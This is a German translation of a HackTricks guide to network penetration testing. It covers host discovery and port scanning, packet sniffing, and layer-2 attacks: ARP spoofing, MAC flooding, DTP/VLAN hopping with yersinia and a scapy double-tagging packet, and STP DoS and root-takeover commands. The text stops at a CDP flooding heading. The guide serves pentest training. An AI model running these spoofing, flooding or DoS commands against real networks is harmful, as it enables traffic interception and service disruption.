# Pentesting Netzwerk

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Pr√§mien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Entdecken von Hosts von au√üen

Dies wird ein **kurzer Abschnitt** dar√ºber sein, wie man **IPs findet, die vom** **Internet** **antworten**.\
In dieser Situation haben Sie einen **IP-Bereich** (vielleicht sogar mehrere **Bereiche**) und m√ºssen nur herausfinden, **welche IPs antworten**.

### ICMP

Dies ist der **einfachste** und **schnellste** Weg, um festzustellen, ob ein Host aktiv ist oder nicht.\
Sie k√∂nnten versuchen, einige **ICMP**-Pakete zu senden und **Antworten zu erwarten**. Der einfachste Weg ist einfach das Senden einer **Echo-Anforderung** und das Erwarten einer Antwort. Sie k√∂nnen dies mit einem einfachen `ping` oder mit `fping` f√ºr **Bereiche** tun.\
Sie k√∂nnten auch **nmap** verwenden, um andere Arten von ICMP-Paketen zu senden (dies umgeht Filter f√ºr √ºbliche ICMP-Echo-Anforderung-Antwort).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP-Port-Erkennung

Es ist sehr h√§ufig festzustellen, dass alle Arten von ICMP-Paketen gefiltert werden. Dann bleibt Ihnen nur noch, zu √ºberpr√ºfen, ob ein Host **versuchen Sie, offene Ports zu finden**. Jeder Host hat **65535 Ports**, daher k√∂nnen Sie bei einem "gro√üen" Umfang **nicht** testen, ob **jeder Port** jedes Hosts ge√∂ffnet ist oder nicht, das w√ºrde zu viel Zeit in Anspruch nehmen.\
Was Sie brauchen, ist also ein **schneller Portscanner** ([masscan](https://github.com/robertdavidgraham/masscan)) und eine Liste der **am h√§ufigsten verwendeten Ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP-Porterkennung

Dies ist nur eine TCP-Porterkennung, die n√ºtzlich ist, wenn Sie sich darauf konzentrieren m√∂chten, HTTP-Dienste zu entdecken:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP-Porterkennung

Sie k√∂nnten auch versuchen, einige **UDP-Ports zu √ºberpr√ºfen**, um zu entscheiden, ob Sie einem **Host** mehr **Aufmerksamkeit schenken** sollten. Da UDP-Dienste normalerweise **nicht mit Daten** auf ein regul√§res leeres UDP-Sondenpaket antworten, ist es schwierig zu sagen, ob ein Port gefiltert oder ge√∂ffnet ist. Der einfachste Weg, dies zu entscheiden, besteht darin, ein Paket im Zusammenhang mit dem ausgef√ºhrten Dienst zu senden. Da Sie nicht wissen, welcher Dienst ausgef√ºhrt wird, sollten Sie den wahrscheinlichsten basierend auf der Portnummer ausprobieren:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die zuvor vorgeschlagene nmap-Zeile wird die **top 1000 UDP-Ports** in jedem Host innerhalb des **/24**-Bereichs testen, aber selbst das wird **>20 Minuten** dauern. Wenn Sie **schnellere Ergebnisse** ben√∂tigen, k√∂nnen Sie [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) verwenden: `./udp-proto-scanner.pl 199.66.11.53/24` Dies sendet diese **UDP-Sonden** an ihren **erwarteten Port** (f√ºr einen /24-Bereich dauert dies nur 1 Minute): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier finden Sie einen guten Leitfaden zu allen bekannten Wifi-Angriffen zum Zeitpunkt des Schreibens:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Entdecken von Hosts von innen

Wenn Sie sich im Netzwerk befinden, m√∂chten Sie wahrscheinlich zuerst **andere Hosts entdecken**. Je nachdem, **wie viel L√§rm** Sie verursachen k√∂nnen/m√∂chten, k√∂nnen verschiedene Aktionen durchgef√ºhrt werden:

### Passiv

Sie k√∂nnen diese Tools verwenden, um Hosts passiv im verbundenen Netzwerk zu entdecken:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktiv

Beachten Sie, dass die in [_**Entdecken von Hosts von au√üen**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) kommentierten Techniken auch **hier angewendet werden k√∂nnen**.\
Da Sie sich jedoch im **selben Netzwerk** wie die anderen Hosts befinden, k√∂nnen Sie **mehr Dinge tun**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktives ICMP

Beachten Sie, dass die im Abschnitt _Entdecken von Hosts von au√üen_ ([_**ICMP**_](./#icmp)) kommentierten Techniken auch hier **angewendet werden k√∂nnen**.\
Da Sie sich jedoch im **selben Netzwerk** wie die anderen Hosts befinden, k√∂nnen Sie **mehr Dinge tun**:

* Wenn Sie eine **Subnetz-Broadcast-Adresse** anpingen, sollte der Ping bei **jedem Host** ankommen und sie k√∂nnten **Ihnen antworten**: `ping -b 10.10.5.255`
* Durch Anpingen der **Netzwerk-Broadcast-Adresse** k√∂nnten Sie sogar Hosts in **anderen Subnetzen** finden: `ping -b 255.255.255.255`
* Verwenden Sie die Flags `-PE`, `-PP`, `-PM` von `nmap`, um die Host-Erkennung durch Senden von **ICMPv4-Echo**, **Zeitstempel** und **Subnetzmaskenanfragen** durchzuf√ºhren: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan wird verwendet, um Computer √ºber eine **Netzwerknachricht einzuschalten**. Das sogenannte Magic Packet, das zum Einschalten des Computers verwendet wird, ist nur ein Paket, bei dem eine **MAC-Zieladresse** angegeben wird und dann **16 Mal** im selben Paket wiederholt wird.\
Diese Art von Paketen wird normalerweise in einem **Ethernet 0x0842** oder in einem **UDP-Paket an Port 9** gesendet.\
Wenn keine **\[MAC]** angegeben ist, wird das Paket an **Broadcast-Ethernet** gesendet (und die Broadcast-MAC wird wiederholt).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scannen von Hosts

Sobald Sie alle IPs (extern oder intern) entdeckt haben, die Sie eingehend scannen m√∂chten, k√∂nnen verschiedene Aktionen durchgef√ºhrt werden.

### TCP

* **Offener** Port: _SYN --> SYN/ACK --> RST_
* **Geschlossener** Port: _SYN --> RST/ACK_
* **Gefilterter** Port: _SYN --> \[KEINE ANTWORT]_
* **Gefilterter** Port: _SYN --> ICMP-Nachricht_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Es gibt 2 M√∂glichkeiten, einen UDP-Port zu scannen:

* Senden Sie ein **UDP-Paket** und √ºberpr√ºfen Sie die Antwort _**ICMP nicht erreichbar**_, wenn der Port **geschlossen** ist (in mehreren F√§llen wird ICMP **gefiltert**, sodass Sie keine Informationen erhalten, ob der Port geschlossen oder ge√∂ffnet ist).
* Senden Sie **formatierte Datagramme**, um eine Antwort von einem **Dienst** zu erhalten (z. B. DNS, DHCP, TFTP und andere, wie in _nmap-payloads_ aufgef√ºhrt). Wenn Sie eine **Antwort** erhalten, ist der Port **ge√∂ffnet**.

**Nmap** wird **beide Optionen kombinieren**, indem es "-sV" verwendet (UDP-Scans sind sehr langsam), aber beachten Sie, dass UDP-Scans langsamer sind als TCP-Scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** ist darauf ausgelegt, zusammen mit **TCP (Transmission Control Protocol)** und **UDP (User Datagram Protocol)** verwendet zu werden. Sein Hauptzweck besteht darin, den Transport von Telefondaten √ºber IP-Netzwerke zu erleichtern und viele der Zuverl√§ssigkeitsmerkmale von **Signaling System 7 (SS7)** widerzuspiegeln. **SCTP** ist eine Kernkomponente der **SIGTRAN**-Protokollfamilie, die darauf abzielt, SS7-Signale √ºber IP-Netzwerke zu transportieren.

Die Unterst√ºtzung f√ºr **SCTP** wird von verschiedenen Betriebssystemen wie **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** und **VxWorks** bereitgestellt, was auf seine breite Akzeptanz und N√ºtzlichkeit im Bereich Telekommunikation und Netzwerke hinweist.

Nmap bietet zwei verschiedene Scans f√ºr SCTP an: _-sY_ und _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS und IPS Umgehung

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Weitere nmap-Optionen**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Offenlegung interner IP-Adressen

**Falsch konfigurierte Router, Firewalls und Netzwerkger√§te** antworten manchmal auf Netzwerksondierungen mit **nicht √∂ffentlichen Quelladressen**. **tcpdump** kann verwendet werden, um Pakete zu identifizieren, die w√§hrend des Tests von privaten Adressen empfangen wurden. Insbesondere auf Kali Linux k√∂nnen Pakete auf der **eth2-Schnittstelle** erfasst werden, die aus dem √∂ffentlichen Internet erreichbar ist. Es ist wichtig zu beachten, dass solche Pakete in einem Setup hinter einem NAT oder einer Firewall wahrscheinlich herausgefiltert werden.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Beim Sniffing k√∂nnen Sie Details zu IP-Bereichen, Subnetzgr√∂√üen, MAC-Adressen und Hostnamen erfahren, indem Sie erfasste Frames und Pakete √ºberpr√ºfen. Wenn das Netzwerk falsch konfiguriert ist oder das Switching-Fabric unter Stress steht, k√∂nnen Angreifer sensible Materialien √ºber passives Netzwerk-Sniffing erfassen.

Wenn ein geschaltetes Ethernet-Netzwerk ordnungsgem√§√ü konfiguriert ist, sehen Sie nur Broadcast-Frames und Material, das f√ºr Ihre MAC-Adresse bestimmt ist.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Man kann auch Pakete von einer entfernten Maschine √ºber eine SSH-Sitzung mit Wireshark als GUI in Echtzeit erfassen.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Offensichtlich.

### Erfassen von Anmeldedaten

Sie k√∂nnen Tools wie [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) verwenden, um Anmeldedaten aus einem pcap oder einer Live-Schnittstelle zu analysieren.

## LAN-Angriffe

### ARP-Spoofing

ARP-Spoofing besteht darin, falsche ARP-Antworten zu senden, um anzuzeigen, dass die IP eines Ger√§ts die MAC unseres Ger√§ts hat. Dann wird das Opfer die ARP-Tabelle √§ndern und jedes Mal unsere Maschine kontaktieren, wenn es die gef√§lschte IP kontaktieren m√∂chte.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Fluten - CAM-√úberlauf

√úberlasten Sie die CAM-Tabelle des Switches, indem Sie viele Pakete mit unterschiedlichen Quell-MAC-Adressen senden. Wenn die CAM-Tabelle voll ist, beginnt der Switch, sich wie ein Hub zu verhalten (indem er den gesamten Datenverkehr broadcastet).
```bash
macof -i <interface>
```
In modernen Switches wurde diese Schwachstelle behoben.

### 802.1Q VLAN / DTP Angriffe

#### Dynamisches Trunking

Das **Dynamic Trunking Protocol (DTP)** ist als Linkschichtprotokoll konzipiert, um ein automatisches System f√ºr Trunking zu erm√∂glichen, das Switches automatisch Ports f√ºr den Trunk-Modus (Trunk) oder Nicht-Trunk-Modus ausw√§hlen l√§sst. Die Implementierung von **DTP** wird oft als Hinweis auf eine suboptimale Netzwerkkonfiguration angesehen, was die Bedeutung der manuellen Konfiguration von Trunks nur dort, wo es notwendig ist, und der Sicherstellung einer ordnungsgem√§√üen Dokumentation unterstreicht.

Standardm√§√üig sind Switch-Ports auf den Betrieb im Dynamischen Auto-Modus eingestellt, was bedeutet, dass sie bereit sind, Trunking zu initiieren, wenn sie von einem benachbarten Switch dazu aufgefordert werden. Ein Sicherheitsproblem tritt auf, wenn ein Pentester oder Angreifer sich mit dem Switch verbindet und ein DTP Desirable Frame sendet, wodurch der Port in den Trunk-Modus wechselt. Diese Aktion erm√∂glicht es dem Angreifer, VLANs durch STP-Frame-Analyse aufzulisten und die VLAN-Segmentierung zu umgehen, indem virtuelle Schnittstellen eingerichtet werden.

Die Pr√§senz von DTP in vielen Switches standardm√§√üig kann von Angreifern ausgenutzt werden, um das Verhalten eines Switches zu imitieren und so Zugriff auf den Datenverkehr √ºber alle VLANs zu erhalten. Das Skript [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) wird verwendet, um eine Schnittstelle zu √ºberwachen und anzuzeigen, ob ein Switch im Default-, Trunk-, Dynamic-, Auto- oder Access-Modus ist, wobei letzterer die einzige Konfiguration ist, die gegen VLAN-Hopping-Angriffe immun ist. Dieses Tool bewertet den Schwachstellenstatus des Switches.

Sollte eine Netzwerkschwachstelle identifiziert werden, kann das _**Yersinia**_ Tool verwendet werden, um "Trunking" √ºber das DTP-Protokoll zu aktivieren, was es erm√∂glicht, Pakete aus allen VLANs zu beobachten.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Um die VLANs aufzulisten, ist es auch m√∂glich, den DTP Desirable Frame mit dem Skript [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) zu generieren. Unterbrechen Sie das Skript unter keinen Umst√§nden. Es injiziert alle drei Sekunden ein DTP Desirable. Die dynamisch erstellten Trunk-Kan√§le am Switch bleiben nur f√ºnf Minuten lang bestehen. Nach f√ºnf Minuten wird der Trunk deaktiviert.
```
sudo python3 DTPHijacking.py --interface eth0
```
Ich m√∂chte darauf hinweisen, dass **Access/Desirable (0x03)** darauf hinweist, dass das DTP-Feld vom Typ Desirable ist, was dem Port sagt, in den Trunk-Modus zu wechseln. Und **802.1Q/802.1Q (0xa5)** zeigt den **802.1Q**-Kapselungstyp an.

Durch die Analyse der STP-Frames **erfahren wir von der Existenz von VLAN 30 und VLAN 60**.

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Angriff auf spezifische VLANs

Sobald Sie die VLAN-IDs und IP-Werte kennen, k√∂nnen Sie **eine virtuelle Schnittstelle konfigurieren, um ein bestimmtes VLAN anzugreifen**.\
Wenn DHCP nicht verf√ºgbar ist, verwenden Sie _ifconfig_, um eine statische IP-Adresse festzulegen.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatischer VLAN-Hopper

Der diskutierte Angriff des **Dynamischen Trunkings und das Erstellen virtueller Schnittstellen zum Entdecken von Hosts in anderen VLANs** werden **automatisch durchgef√ºhrt** von dem Tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doppelte Markierung

Wenn ein Angreifer den Wert der **MAC-Adresse, IP und VLAN-ID des Opferhosts** kennt, k√∂nnte er versuchen, einen Rahmen **mit doppelter Markierung** mit seinem bestimmten VLAN und dem VLAN des Opfers zu versehen und ein Paket zu senden. Da das Opfer **nicht in der Lage sein wird, sich mit dem Angreifer zu verbinden**, ist die **beste Option f√ºr den Angreifer die Kommunikation √ºber UDP** mit Protokollen, die einige interessante Aktionen ausf√ºhren k√∂nnen (wie SNMP).

Eine weitere Option f√ºr den Angreifer besteht darin, einen **TCP-Port-Scan zu starten, wobei die IP gef√§lscht wird, die vom Angreifer kontrolliert und vom Opfer erreichbar ist** (wahrscheinlich √ºber das Internet). Anschlie√üend k√∂nnte der Angreifer in dem zweiten Host, der ihm geh√∂rt, schn√ºffeln, ob er Pakete vom Opfer empf√§ngt.

![](<../../.gitbook/assets/image (190).png>)

Um diesen Angriff durchzuf√ºhren, k√∂nnten Sie scapy verwenden: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Seitliche VLAN-Segmentierungsumgehung <a href="#d679" id="d679"></a>

Wenn Sie **Zugriff auf einen Switch haben, mit dem Sie direkt verbunden sind**, haben Sie die M√∂glichkeit, die **VLAN-Segmentierung im Netzwerk zu umgehen**. Schalten Sie einfach den Port in den Trunk-Modus (auch als Trunk bekannt), erstellen Sie virtuelle Schnittstellen mit den IDs der Ziel-VLANs und konfigurieren Sie eine IP-Adresse. Sie k√∂nnen versuchen, die Adresse dynamisch (DHCP) anzufordern, oder Sie k√∂nnen sie statisch konfigurieren. Es h√§ngt vom Fall ab.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN-Umgehung

In bestimmten Umgebungen, wie z. B. Gast-WLAN-Netzwerken, werden **Portisolierung (auch als private VLAN bekannt)** Einstellungen implementiert, um zu verhindern, dass Clients, die mit einem drahtlosen Zugangspunkt verbunden sind, direkt miteinander kommunizieren. Es wurde jedoch eine Technik identifiziert, die diese Isolationsma√ünahmen umgehen kann. Diese Technik nutzt entweder das Fehlen von Netzwerk-ACLs oder deren falsche Konfiguration aus, um IP-Pakete durch einen Router zu routen, um einen anderen Client im selben Netzwerk zu erreichen.

Der Angriff wird ausgef√ºhrt, indem ein **Paket erstellt wird, das die IP-Adresse des Zielclients tr√§gt, aber mit der MAC-Adresse des Routers**. Dadurch leitet der Router das Paket irrt√ºmlicherweise an den Zielclient weiter. Dieser Ansatz √§hnelt dem in Double Tagging Attacks verwendeten, bei dem die F√§higkeit, einen f√ºr das Opfer zug√§nglichen Host zu kontrollieren, ausgenutzt wird, um die Sicherheitsl√ºcke zu nutzen.

**Schl√ºsselschritte des Angriffs:**

1. **Erstellen eines Pakets:** Ein Paket wird speziell erstellt, um die IP-Adresse des Zielclients, aber mit der MAC-Adresse des Routers, zu enthalten.
2. **Ausnutzen des Routerverhaltens:** Das erstellte Paket wird an den Router gesendet, der aufgrund der Konfiguration das Paket an den Zielclient weiterleitet und somit die durch private VLAN-Einstellungen bereitgestellte Isolierung umgeht.

### VTP-Angriffe

VTP (VLAN Trunking Protocol) zentralisiert das VLAN-Management. Es verwendet Revisionsnummern, um die Integrit√§t der VLAN-Datenbank zu gew√§hrleisten; jede √Ñnderung erh√∂ht diese Nummer. Switches √ºbernehmen Konfigurationen mit h√∂heren Revisionsnummern und aktualisieren ihre eigenen VLAN-Datenbanken.

#### VTP-Dom√§nenrollen

* **VTP-Server:** Verwaltet VLANs ‚Äì erstellt, l√∂scht, modifiziert. Er sendet VTP-Ank√ºndigungen an Dom√§nenmitglieder.
* **VTP-Client:** Empf√§ngt VTP-Ank√ºndigungen, um seine VLAN-Datenbank zu synchronisieren. Diese Rolle ist von lokalen VLAN-Konfigurations√§nderungen ausgeschlossen.
* **VTP-Transparent:** Nimmt nicht an VTP-Updates teil, leitet jedoch VTP-Ank√ºndigungen weiter. Unbeeinflusst von VTP-Angriffen, beh√§lt er eine konstante Revisionsnummer von null bei.

#### VTP-Anzeigetypen

* **Zusammenfassungsanzeige:** Wird alle 300 Sekunden vom VTP-Server ausgestrahlt und enth√§lt wesentliche Dom√§neninformationen.
* **Teilanzeige:** Wird nach VLAN-Konfigurations√§nderungen gesendet.
* **Anforderung f√ºr Anzeige:** Wird von einem VTP-Client ausgegeben, um eine Zusammenfassungsanzeige anzufordern, normalerweise als Reaktion auf die Erkennung einer h√∂heren Konfigurationsrevisionsnummer.

VTP-Schwachstellen sind ausschlie√ülich √ºber Trunk-Ports ausnutzbar, da VTP-Ank√ºndigungen ausschlie√ülich durch sie zirkulieren. Nach DTP-Angriffsszenarien k√∂nnte sich die Ausrichtung auf VTP verlagern. Tools wie Yersinia k√∂nnen VTP-Angriffe erleichtern, um die VLAN-Datenbank zu l√∂schen und somit das Netzwerk effektiv zu st√∂ren.

Hinweis: Diese Diskussion bezieht sich auf VTP-Version 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Im grafischen Modus von Yersinia w√§hlen Sie die Option zum L√∂schen aller VTP-VLANs, um die VLAN-Datenbank zu bereinigen.

### STP-Angriffe

**Wenn Sie keine BPDU-Frames auf Ihren Schnittstellen erfassen k√∂nnen, ist es unwahrscheinlich, dass Sie bei einem STP-Angriff erfolgreich sein werden.**

#### **STP BPDU DoS**

Durch das Senden vieler BPDUs TCP (Topology Change Notification) oder Conf (die BPDUs, die gesendet werden, wenn die Topologie erstellt wird) werden die Switches √ºberlastet und funktionieren nicht mehr korrekt.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Angriff**

Wenn ein TCP gesendet wird, wird die CAM-Tabelle der Switches in 15 Sekunden gel√∂scht. Wenn Sie kontinuierlich diese Art von Paketen senden, wird die CAM-Tabelle kontinuierlich neu gestartet (oder alle 15 Sekunden) und wenn sie neu gestartet wird, verh√§lt sich der Switch wie ein Hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Der Angreifer simuliert das Verhalten eines Switches, um zum STP-Root des Netzwerks zu werden. Anschlie√üend wird mehr Datenverkehr √ºber ihn geleitet. Dies ist interessant, wenn Sie mit zwei verschiedenen Switches verbunden sind.\
Dies wird durch das Senden von BPDUs CONF-Paketen erreicht, in denen angegeben wird, dass der **Priorit√§ts**-Wert geringer ist als die tats√§chliche Priorit√§t des aktuellen Root-Switches.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Wenn der Angreifer mit 2 Switches verbunden ist, kann er die Wurzel des neuen Baums sein und der gesamte Datenverkehr zwischen diesen Switches wird durch ihn hindurchgeleitet** (ein MITM-Angriff wird durchgef√ºhrt).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP-Angriffe

Das CISCO Discovery Protocol (CDP) ist f√ºr die Kommunikation zwischen CISCO-Ger√§ten unerl√§sslich und erm√∂glicht es ihnen, **sich gegenseitig zu identifizieren und Konfigurationsdetails auszutauschen**.

#### Passive Datensammlung <a href="#id-0e0f" id="id-0e0f"></a>

CDP ist so konfiguriert, dass Informationen √ºber alle Ports gesendet werden, was zu einem Sicherheitsrisiko f√ºhren kann. Ein Angreifer, der sich mit einem Switch-Port verbindet, k√∂nnte Netzwerksniffer wie **Wireshark**, **tcpdump** oder **Yersinia** einsetzen. Diese Aktion kann sensible Daten √ºber das Netzwerkger√§t offenlegen, einschlie√ülich des Modells und der Version von Cisco IOS, die es ausf√ºhrt. Der Angreifer k√∂nnte dann gezielt Schwachstellen in der identifizierten Cisco IOS-Version angreifen.

#### Induzierung von CDP-Tabellen√ºberflutung <a href="#id-0d6a" id="id-0d6a"></a>

